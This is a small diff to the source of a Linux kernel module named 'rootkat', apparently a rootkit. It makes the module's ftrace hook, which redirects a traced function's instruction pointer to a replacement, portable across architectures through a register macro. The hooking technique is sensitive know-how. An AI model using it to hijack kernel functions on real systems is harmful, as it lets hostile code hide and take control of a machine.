@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 #include <linux/ftrace.h>
 #include <linux/kernel.h>
+#include "arch_compat.h"
 #include "ftrace_hook.h"
 #include "resolver.h"
 
@@ -20,7 +21,7 @@ static void notrace rootkat_ftrace_thunk(unsigned long ip, unsigned long parent_
 	if (within_module(parent_ip, THIS_MODULE))
 		return;
 
-	regs->ip = (unsigned long)h->replacement;
+	PT_REGS_IP(regs) = (unsigned long)h->replacement;
 }
 
 int rootkat_hook_install_at(struct rootkat_hook *h, unsigned long addr)
